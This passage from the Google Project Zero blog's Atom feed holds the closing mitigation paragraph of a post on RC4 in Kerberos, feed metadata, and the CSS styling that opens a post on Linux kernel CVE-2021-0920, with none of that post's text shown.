underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos Armoring (FAST)&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; on all clients and KDCs in the environment. This would make it more difficult to inspect and tamper with Kerberos authentication traffic. However it's not a panacea, for example for FAST to work the domain joined computer needs to first authenticate without FAST to get a key they can then use for protecting the communications. If that initial authentication is compromised the entire protection fails.&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;/span&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/8303427457754488503/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/8303427457754488503"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/8303427457754488503"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html","@title":"RC4 Is Still Considered Harmful"}],"author":{"name":"Unknown","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRE6Kj-svyxGDL8OhnPM46jhk7cf3JEJrssrRSwToM3q63wAaqtboIVHeEiZ5bONQoHZNapfdxpDr3kXMbxLakja1tqshef6N4GDNlw1BXyhanRY_Jg2zDqTlIPmHZBZ2XvCMf_23GXoRSS-18_zLCfwYV2v4xOR5usrM4zq1AONy2U57oCk-n-BpW/s72-c/image5.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-6481767562526230244","published":"2022-08-10T16:00:00.004-07:00","updated":"2022-08-24T11:55:31.661-07:00","title":{"@type":"text","#text":"The quantum state of Linux kernel garbage collection CVE-2021-0920 (Part I)"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=wJuDEFlUsDZt7lpAAPdLm9CoNqneSjGN6FUREF5POP9krml-9Eg4KzR8naUO0aF3kuG_eoWNft1SfWZjF8JeEg');.lst-kix_wm3dnufq67dx-7&gt;li:before{content:\"-  \"}.lst-kix_wm3dnufq67dx-8&gt;li:before{content:\"-  \"}ol.lst-kix_iptxq54yrrnf-3.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-3 0}.lst-kix_u3opzkdcnklc-1&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-1}.lst-kix_wm3dnufq67dx-1&gt;li:before{content:\"-  \"}.lst-kix_iptxq54yrrnf-4&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-4}ol.lst-kix_mfudkcwv2w89-7.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-7 0}.lst-kix_wm3dnufq67dx-0&gt;li:before{content:\"-  \"}.lst-kix_hk8k8itxmlfp-4&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-4}.lst-kix_8chkxhfzc2ds-3&gt;li:before{content:\"-  \"}.lst-kix_8chkxhfzc2ds-5&gt;li:before{content:\"-  \"}.lst-kix_8chkxhfzc2ds-4&gt;li:before{content:\"-  \"}.lst-kix_8chkxhfzc2ds-8&gt;li:before{content:\"-  \"}.lst-kix_8chkxhfzc2ds-7&gt;li:before{content:\"-  \"}.lst-kix_8chkxhfzc2ds-6&gt;li:before{content:\"-  \"}ol.lst-kix_58ja23nrczhl-0{list-style-type:none}ol.lst-kix_51hgl6mwb3et-2.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-2 0}ol.lst-kix_58ja23nrczhl-3{list-style-type:none}ol.lst-kix_58ja23nrczhl-4{list-style-type:none}ol.lst-kix_58ja23nrczhl-1{list-style-type:none}ol.lst-kix_58ja23nrczhl-2{list-style-type:none}ol.lst-kix_58ja23nrczhl-7{list-style-type:none}ol.lst-kix_58ja23nrczhl-8{list-style-type:none}ol.lst-kix_58ja23nrczhl-5{list-style-type:none}.lst-kix_58ja23nrczhl-4&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-4}ol.lst-kix_58ja23nrczhl-6{list-style-type:none}ol.lst-kix_7y90gfloiotx-8.start{counter-reset:lst-ctn-kix_7y90gfloiotx-8 0}.lst-kix_5yi4tofw6s0z-1&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-1}.lst-kix_51hgl6mwb3et-0&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-0,decimal) \". \"}.lst-kix_51hgl6mwb3et-1&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-1,lower-latin) \". \"}.lst-kix_51hgl6mwb3et-2&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-2,lower-roman) \". \"}.lst-kix_5oipgjcxugcr-0&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-0}ol.lst-kix_j5vmamheymgq-4.start{counter-reset:lst-ctn-kix_j5vmamheymgq-4 0}.lst-kix_51hgl6mwb3et-3&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-3,decimal) \". \"}ol.lst-kix_8mkn8rg9im4a-0.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-0 0}.lst-kix_51hgl6mwb3et-4&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-4,lower-latin) \". \"}.lst-kix_51hgl6mwb3et-6&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-6,decimal) \". \"}.lst-kix_51hgl6mwb3et-5&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-5,lower-roman) \". \"}.lst-kix_whw4pjgxp3w1-2&gt;li:before{content:\"-  \"}.lst-kix_hk8k8itxmlfp-0&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-0,decimal) \". \"}.lst-kix_51hgl6mwb3et-8&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-8,lower-roman) \". \"}.lst-kix_whw4pjgxp3w1-1&gt;li:before{content:\"-  \"}.lst-kix_51hgl6mwb3et-7&gt;li:before{content:\"\" counter(lst-ctn-kix_51hgl6mwb3et-7,lower-latin) \". \"}.lst-kix_whw4pjgxp3w1-0&gt;li:before{content:\"-  \"}ol.lst-kix_mfudkcwv2w89-2.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-2 0}.lst-kix_hk8k8itxmlfp-3&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-3,decimal) \". \"}.lst-kix_hk8k8itxmlfp-2&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-2,lower-roman) \". \"}.lst-kix_hk8k8itxmlfp-4&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-4,lower-latin) \". \"}.lst-kix_hk8k8itxmlfp-1&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-1,lower-latin) \". \"}.lst-kix_hk8k8itxmlfp-5&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-5,lower-roman) \". \"}ul.lst-kix_9gryrzygx46m-6{list-style-type:none}ul.lst-kix_9gryrzygx46m-5{list-style-type:none}ul.lst-kix_9gryrzygx46m-4{list-style-type:none}ul.lst-kix_9gryrzygx46m-3{list-style-type:none}ul.lst-kix_9gryrzygx46m-8{list-style-type:none}ul.lst-kix_9gryrzygx46m-7{list-style-type:none}.lst-kix_5yi4tofw6s0z-8&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-8}.lst-kix_wm3dnufq67dx-2&gt;li:before{content:\"-  \"}ol.lst-kix_5yi4tofw6s0z-4.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-4 0}.lst-kix_wm3dnufq67dx-3&gt;li:before{content:\"-  \"}.lst-kix_wm3dnufq67dx-4&gt;li:before{content:\"-  \"}ol.lst-kix_iptxq54yrrnf-8.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-8 0}ol.lst-kix_7y90gfloiotx-3.start{counter-reset:lst-ctn-kix_7y90gfloiotx-3 0}.lst-kix_hk8k8itxmlfp-7&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-7,lower-latin) \". \"}.lst-kix_wm3dnufq67dx-5&gt;li:before{content:\"-  \"}.lst-kix_wm3dnufq67dx-6&gt;li:before{content:\"-  \"}.lst-kix_hk8k8itxmlfp-6&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-6,decimal) \". \"}.lst-kix_hk8k8itxmlfp-8&gt;li:before{content:\"\" counter(lst-ctn-kix_hk8k8itxmlfp-8,lower-roman) \". \"}ol.lst-kix_58ja23nrczhl-4.start{counter-reset:lst-ctn-kix_58ja23nrczhl-4 0}ul.lst-kix_wm3dnufq67dx-0{list-style-type:none}.lst-kix_yjo4cwnqbjp0-2&gt;li:before{content:\"-  \"}ul.lst-kix_wm3dnufq67dx-2{list-style-type:none}ul.lst-kix_wm3dnufq67dx-1{list-style-type:none}.lst-kix_yjo4cwnqbjp0-0&gt;li:before{content:\"-  \"}ul.lst-kix_wm3dnufq67dx-8{list-style-type:none}ul.lst-kix_wm3dnufq67dx-7{list-style-type:none}ul.lst-kix_wm3dnufq67dx-4{list-style-type:none}ul.lst-kix_9gryrzygx46m-2{list-style-type:none}ul.lst-kix_wm3dnufq67dx-3{list-style-type:none}ul.lst-kix_9gryrzygx46m-1{list-style-type:none}ul.lst-kix_wm3dnufq67dx-6{list-style-type:none}ul.lst-kix_9gryrzygx46m-0{list-style-type:none}ul.lst-kix_wm3dnufq67dx-5{list-style-type:none}.lst-kix_yjo4cwnqbjp0-6&gt;li:before{content:\"-  \"}.lst-kix_6l3lpr6ytz51-0&gt;li:before{content:\"-  \"}.lst-kix_yjo4cwnqbjp0-4&gt;li:before{content:\"-  \"}.lst-kix_whw4pjgxp3w1-6&gt;li:before{content:\"-  \"}.lst-kix_j5vmamheymgq-3&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-3}.lst-kix_7y90gfloiotx-7&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-7}.lst-kix_9prd8pa3o8y7-6&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-6}ol.lst-kix_9prd8pa3o8y7-7.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-7 0}.lst-kix_whw4pjgxp3w1-4&gt;li:before{content:\"-  \"}ol.lst-kix_u3opzkdcnklc-8.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-8 0}.lst-kix_whw4pjgxp3w1-8&gt;li:before{content:\"-  \"}ol.lst-kix_51hgl6mwb3et-7.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-7 0}ol.lst-kix_hk8k8itxmlfp-7.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-7 0}ol.lst-kix_p4ttii5g8cnl-7.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-7 0}ol.lst-kix_5oipgjcxugcr-8.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-8 0}.lst-kix_j5vmamheymgq-7&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-7,lower-latin) \". \"}.lst-kix_9prd8pa3o8y7-5&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-5}.lst-kix_8chkxhfzc2ds-1&gt;li:before{content:\"-  \"}.lst-kix_u3opzkdcnklc-8&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-8}.lst-kix_6l3lpr6ytz51-4&gt;li:before{content:\"-  \"}.lst-kix_6l3lpr6ytz51-6&gt;li:before{content:\"-  \"}.lst-kix_j5vmamheymgq-5&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-5,lower-roman) \". \"}.lst-kix_6l3lpr6ytz51-2&gt;li:before{content:\"-  \"}.lst-kix_5oipgjcxugcr-8&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-8}.lst-kix_j5vmamheymgq-1&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-1,lower-latin) \". \"}.lst-kix_j5vmamheymgq-3&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-3,decimal) \". \"}.lst-kix_6l3lpr6ytz51-8&gt;li:before{content:\"-  \"}.lst-kix_7y90gfloiotx-6&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-6}.lst-kix_iptxq54yrrnf-5&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-5}ol.lst-kix_hk8k8itxmlfp-8.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-8 0}.lst-kix_hk8k8itxmlfp-5&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-5}ol.lst-kix_p4ttii5g8cnl-6.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-6 0}.lst-kix_mfudkcwv2w89-1&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-1}.lst-kix_58ja23nrczhl-3&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-3}.lst-kix_hk8k8itxmlfp-3&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-3}.lst-kix_u3opzkdcnklc-4&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-4,lower-latin) \". \"}.lst-kix_u3opzkdcnklc-8&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-8,lower-roman) \". \"}.lst-kix_u3opzkdcnklc-3&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-3,decimal) \". \"}.lst-kix_u3opzkdcnklc-7&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-7,lower-latin) \". \"}.lst-kix_iptxq54yrrnf-3&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-3}ol.lst-kix_p4ttii5g8cnl-1.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-1 0}ol.lst-kix_j5vmamheymgq-8.start{counter-reset:lst-ctn-kix_j5vmamheymgq-8 0}ul.lst-kix_h1p96gz9lzq4-0{list-style-type:none}ul.lst-kix_h1p96gz9lzq4-1{list-style-type:none}.lst-kix_u3opzkdcnklc-0&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-0,decimal) \". \"}ul.lst-kix_h1p96gz9lzq4-4{list-style-type:none}ul.lst-kix_h1p96gz9lzq4-5{list-style-type:none}ul.lst-kix_h1p96gz9lzq4-2{list-style-type:none}ul.lst-kix_h1p96gz9lzq4-3{list-style-type:none}ul.lst-kix_h1p96gz9lzq4-8{list-style-type:none}.lst-kix_mfudkcwv2w89-3&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-3}ul.lst-kix_h1p96gz9lzq4-6{list-style-type:none}ul.lst-kix_h1p96gz9lzq4-7{list-style-type:none}.lst-kix_3a2g7o19wgb3-2&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-2}.lst-kix_p4ttii5g8cnl-5&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-5}.lst-kix_5oipgjcxugcr-1&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-1}.lst-kix_3a2g7o19wgb3-4&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-4}ol.lst-kix_j5vmamheymgq-3.start{counter-reset:lst-ctn-kix_j5vmamheymgq-3 0}ol.lst-kix_u3opzkdcnklc-7.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-7 0}.lst-kix_yjo4cwnqbjp0-8&gt;li:before{content:\"-  \"}ol.lst-kix_9prd8pa3o8y7-6.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-6 0}.lst-kix_g3pd9wzbzpzz-3&gt;li:before{content:\"-  \"}.lst-kix_g3pd9wzbzpzz-7&gt;li:before{content:\"-  \"}ol.lst-kix_p4ttii5g8cnl-2.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-2 0}.lst-kix_yjo4cwnqbjp0-1&gt;li:before{content:\"-  \"}ol.lst-kix_iptxq54yrrnf-7.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-7 0}.lst-kix_yjo4cwnqbjp0-5&gt;li:before{content:\"-  \"}.lst-kix_yn2ql2u2egdg-0&gt;li:before{content:\"-  \"}ol.lst-kix_51hgl6mwb3et-1.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-1 0}.lst-kix_dqkfvt9lb2wy-1&gt;li:before{content:\"-  \"}ol.lst-kix_iptxq54yrrnf-4.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-4 0}.lst-kix_whw4pjgxp3w1-5&gt;li:before{content:\"-  \"}.lst-kix_51hgl6mwb3et-2&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-2}.lst-kix_yn2ql2u2egdg-8&gt;li:before{content:\"-  \"}ol.lst-kix_u3opzkdcnklc-2.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-2 0}.lst-kix_mfudkcwv2w89-6&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-6,decimal) \". \"}ol.lst-kix_9prd8pa3o8y7-1.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-1 0}.lst-kix_dqkfvt9lb2wy-5&gt;li:before{content:\"-  \"}.lst-kix_yn2ql2u2egdg-4&gt;li:before{content:\"-  \"}.lst-kix_mfudkcwv2w89-2&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-2,lower-roman) \". \"}.lst-kix_5oipgjcxugcr-6&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-6,decimal) \". \"}.lst-kix_3a2g7o19wgb3-7&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-7,lower-latin) \". \"}.lst-kix_5oipgjcxugcr-2&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-2,lower-roman) \". \"}.lst-kix_yzib59bcdnhj-4&gt;li:before{content:\"-  \"}.lst-kix_iptxq54yrrnf-4&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-4,lower-latin) \". \"}.lst-kix_j5vmamheymgq-1&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-1}ol.lst-kix_u3opzkdcnklc-4.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-4 0}.lst-kix_8chkxhfzc2ds-0&gt;li:before{content:\"-  \"}.lst-kix_3a2g7o19wgb3-3&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-3,decimal) \". \"}.lst-kix_iptxq54yrrnf-8&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-8,lower-roman) \". \"}.lst-kix_j5vmamheymgq-8&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-8,lower-roman) \". \"}.lst-kix_mfudkcwv2w89-8&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-8}.lst-kix_yzib59bcdnhj-0&gt;li:before{content:\"-  \"}.lst-kix_8mkn8rg9im4a-2&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-2}.lst-kix_h1p96gz9lzq4-0&gt;li:before{content:\"-  \"}.lst-kix_9prd8pa3o8y7-2&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-2,lower-roman) \". \"}.lst-kix_9prd8pa3o8y7-6&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-6,decimal) \". \"}.lst-kix_h1p96gz9lzq4-4&gt;li:before{content:\"-  \"}ol.lst-kix_9prd8pa3o8y7-2.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-2 0}.lst-kix_j5vmamheymgq-4&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-4,lower-latin) \". \"}.lst-kix_6l3lpr6ytz51-3&gt;li:before{content:\"-  \"}.lst-kix_h1p96gz9lzq4-8&gt;li:before{content:\"-  \"}ol.lst-kix_u3opzkdcnklc-3.start{counter-reset:lst-ctn-kix_u3opzkdcnklc-3 0}.lst-kix_p4ttii5g8cnl-7&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-7}.lst-kix_yzib59bcdnhj-8&gt;li:before{content:\"-  \"}.lst-kix_j5vmamheymgq-0&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-0,decimal) \". \"}.lst-kix_6l3lpr6ytz51-7&gt;li:before{content:\"-  \"}ol.lst-kix_5yi4tofw6s0z-8{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-7{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-6{list-style-type:none}.lst-kix_58ja23nrczhl-2&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-2}ol.lst-kix_5yi4tofw6s0z-5{list-style-type:none}.lst-kix_7y90gfloiotx-1&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-1}ol.lst-kix_3a2g7o19wgb3-1.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-1 0}.lst-kix_iptxq54yrrnf-6&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-6}.lst-kix_8mkn8rg9im4a-4&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-4}ol.lst-kix_51hgl6mwb3et-8.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-8 0}ol.lst-kix_7y90gfloiotx-2.start{counter-reset:lst-ctn-kix_7y90gfloiotx-2 0}.lst-kix_iptxq54yrrnf-2&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-2,lower-roman) \". \"}.lst-kix_u3opzkdcnklc-3&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-3}ul.lst-kix_yn2ql2u2egdg-6{list-style-type:none}ul.lst-kix_yn2ql2u2egdg-5{list-style-type:none}ul.lst-kix_yn2ql2u2egdg-8{list-style-type:none}ul.lst-kix_yn2ql2u2egdg-7{list-style-type:none}ol.lst-kix_8mkn8rg9im4a-1.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-1 0}.lst-kix_p4ttii5g8cnl-0&gt;li:before{content:\"\" counter(lst-ctn-kix_p4ttii5g8cnl-0,decimal) \". \"}.lst-kix_p4ttii5g8cnl-3&gt;li:before{content:\"\" counter(lst-ctn-kix_p4ttii5g8cnl-3,decimal) \". \"}.lst-kix_iptxq54yrrnf-2&gt;li{counter-increment:lst-ctn-kix_iptxq54yrrnf-2}.lst-kix_j5vmamheymgq-8&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-8}.lst-kix_p4ttii5g8cnl-5&gt;li:before{content:\"\" counter(lst-ctn-kix_p4ttii5g8cnl-5,lower-roman) \". \"}.lst-kix_p4ttii5g8cnl-6&gt;li:before{content:\"\" counter(lst-ctn-kix_p4ttii5g8cnl-6,decimal) \". \"}ol.lst-kix_51hgl6mwb3et-3.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-3 0}.lst-kix_58ja23nrczhl-6&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-6}.lst-kix_7y90gfloiotx-8&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-8}ol.lst-kix_3a2g7o19wgb3-6.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-6 0}ol.lst-kix_58ja23nrczhl-5.start{counter-reset:lst-ctn-kix_58ja23nrczhl-5 0}ol.lst-kix_p4ttii5g8cnl-3.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-3 0}ol.lst-kix_5yi4tofw6s0z-0{list-style-type:none}ol.lst-kix_8mkn8rg9im4a-6.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-6 0}.lst-kix_58ja23nrczhl-5&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-5,lower-roman) \". \"}.lst-kix_p4ttii5g8cnl-8&gt;li:before{content:\"\" counter(lst-ctn-kix_p4ttii5g8cnl-8,lower-roman) \". \"}ol.lst-kix_5yi4tofw6s0z-4{list-style-type:none}.lst-kix_58ja23nrczhl-4&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-4,lower-latin) \". \"}ol.lst-kix_5yi4tofw6s0z-3{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-2{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-1{list-style-type:none}.lst-kix_58ja23nrczhl-2&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-2,lower-roman) \". \"}.lst-kix_g3pd9wzbzpzz-6&gt;li:before{content:\"-  \"}ol.lst-kix_3a2g7o19wgb3-8.start{counter-reset:lst-ctn-kix_3a2g7o19wgb3-8 0}ol.lst-kix_8mkn8rg9im4a-8.start{counter-reset:lst-ctn-kix_8mkn8rg9im4a-8 0}.lst-kix_yn2ql2u2egdg-1&gt;li:before{content:\"-  \"}.lst-kix_58ja23nrczhl-7&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-7,lower-latin) \". \"}ol.lst-kix_7y90gfloiotx-1{list-style-type:none}ol.lst-kix_7y90gfloiotx-0{list-style-type:none}.lst-kix_g3pd9wzbzpzz-4&gt;li:before{content:\"-  \"}ol.lst-kix_7y90gfloiotx-4.start{counter-reset:lst-ctn-kix_7y90gfloiotx-4 0}.lst-kix_dqkfvt9lb2wy-0&gt;li:before{content:\"-  \"}ol.lst-kix_7y90gfloiotx-7{list-style-type:none}ol.lst-kix_7y90gfloiotx-6{list-style-type:none}ol.lst-kix_7y90gfloiotx-8{list-style-type:none}ol.lst-kix_7y90gfloiotx-3{list-style-type:none}ol.lst-kix_7y90gfloiotx-2{list-style-type:none}ol.lst-kix_7y90gfloiotx-5{list-style-type:none}ol.lst-kix_7y90gfloiotx-4{list-style-type:none}.lst-kix_k47gmg94hbw2-5&gt;li:before{content:\"-  \"}ol.lst-kix_p4ttii5g8cnl-5.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-5 0}.lst-kix_mfudkcwv2w89-7&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-7,lower-latin) \". \"}.lst-kix_yn2ql2u2egdg-3&gt;li:before{content:\"-  \"}ol.lst-kix_hk8k8itxmlfp-4.start{counter-reset:lst-ctn-kix_hk8k8itxmlfp-4 0}.lst-kix_mfudkcwv2w89-1&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-1,lower-latin) \". \"}.lst-kix_dqkfvt9lb2wy-6&gt;li:before{content:\"-  \"}ol.lst-kix_p4ttii5g8cnl-8.start{counter-reset:lst-ctn-kix_p4ttii5g8cnl-8 0}.lst-kix_k47gmg94hbw2-3&gt;li:before{content:\"-  \"}.lst-kix_dqkfvt9lb2wy-8&gt;li:before{content:\"-  \"}.lst-kix_3a2g7o19wgb3-8&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-8,lower-roman) \". \"}.lst-kix_5oipgjcxugcr-5&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-5,lower-roman) \". \"}ol.lst-kix_58ja23nrczhl-8.start{counter-reset:lst-ctn-kix_58ja23nrczhl-8 0}.lst-kix_9gryrzygx46m-1&gt;li:before{content:\"-  \"}ul.lst-kix_yn2ql2u2egdg-2{list-style-type:none}ul.lst-kix_yn2ql2u2egdg-1{list-style-type:none}.lst-kix_5oipgjcxugcr-3&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-3,decimal) \". \"}ul.lst-kix_yn2ql2u2egdg-4{list-style-type:none}ul.lst-kix_yn2ql2u2egdg-3{list-style-type:none}.lst-kix_58ja23nrczhl-5&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-5}ul.lst-kix_yn2ql2u2egdg-0{list-style-type:none}.lst-kix_9gryrzygx46m-7&gt;li:before{content:\"-  \"}.lst-kix_3a2g7o19wgb3-0&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-0,decimal) \". \"}.lst-kix_iptxq54yrrnf-5&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-5,lower-roman) \". \"}.lst-kix_iptxq54yrrnf-7&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-7,lower-latin) \". \"}.lst-kix_3a2g7o19wgb3-2&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-2,lower-roman) \". \"}.lst-kix_9prd8pa3o8y7-3&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-3,decimal) \". \"}ol.lst-kix_51hgl6mwb3et-6.start{counter-reset:lst-ctn-kix_51hgl6mwb3et-6 0}.lst-kix_zcvcgbx5ju56-1&gt;li:before{content:\"-  \"}.lst-kix_5oipgjcxugcr-2&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-2}ol.lst-kix_7y90gfloiotx-7.start{counter-reset:lst-ctn-kix_7y90gfloiotx-7 